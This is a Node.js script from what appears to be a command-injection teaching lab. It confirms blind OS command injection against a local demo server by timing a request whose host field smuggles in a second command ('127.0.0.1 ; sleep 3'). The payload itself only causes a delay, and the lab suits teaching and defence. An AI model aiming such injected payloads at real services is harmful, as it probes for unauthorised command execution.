'use strict';

/**
 * Attack 3 — Blind (time-based) injection (CWE-78).
 *
 * Sometimes the output of an injected command is NOT reflected back to the
 * attacker. Injection is still exploitable: we make the server pause, and
 * measure how long the response takes. A reliable delay that only appears when
 * we inject a sleep proves our command executed, even with no output to read.
 *
 *   Windows : 127.0.0.1 & ping -n 4 127.0.0.1   (the extra pings take ~3s)
 *   POSIX   : 127.0.0.1 ; sleep 3
 *
 * We first time a normal request as a baseline, then time the injected one.
 * A large, consistent gap = blind injection confirmed. (The payload stays well
 * under the server's 5s command timeout.) Local server only; nothing is
 * damaged — we only make the machine wait.
 */
const BASE = process.env.TARGET || 'http://localhost:5000';
const isWin = process.platform === 'win32';
const SEP = isWin ? '&' : ';';
const DELAY = isWin ? 'ping -n 4 127.0.0.1' : 'sleep 3';

const BASELINE = '127.0.0.1';
const PAYLOAD = `127.0.0.1 ${SEP} ${DELAY}`;

async function timeRun(host) {
  const started = Date.now();
  const res = await fetch(`${BASE}/run`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
    body: JSON.stringify({ tool: 'ping', host }),
  });
  const data = await res.json();
  return { ms: Date.now() - started, data };
}

(async () => {
  console.log('=== Attack 3: blind (time-based) injection ===');
  console.log(`Target : ${BASE}/run`);
  console.log(`Payload: tool=ping  host="${PAYLOAD}"`);
  console.log('');

  let base, inj;
  try {
    base = await timeRun(BASELINE);
    inj = await timeRun(PAYLOAD);
  } catch (err) {
    console.error(`Could not reach the server (${err.message}).`);
    console.error('Start it first with:  npm run start:vulnerable');
    process.exit(1);
  }

  console.log(`Server mode      : ${inj.data.secure ? 'SECURE' : 'VULNERABLE'}`);
  console.log(`Baseline request : ${base.ms} ms   (host "${BASELINE}")`);
  console.log(`Injected request : ${inj.ms} ms   (host with injected delay)`);

  if (!inj.data.result.ran) {
    console.log(`Guard            : BLOCKED — ${inj.data.result.guard.reason}`);
    console.log('\nResult: injection PREVENTED. No added delay, because nothing extra ran.');
    return;
  }

  const gap = inj.ms - base.ms;
  console.log(`Added delay      : ~${gap} ms`);
  if (gap > 1500) {
    console.log(
      '\nResult: blind injection CONFIRMED. The injected sleep made the server pause' +
        '\nfor seconds longer than a normal request — our command ran even though its' +
        '\noutput was never shown to us.'
    );
  } else {
    console.log('\nResult: no significant delay — injection did NOT succeed in this mode.');
  }
})();
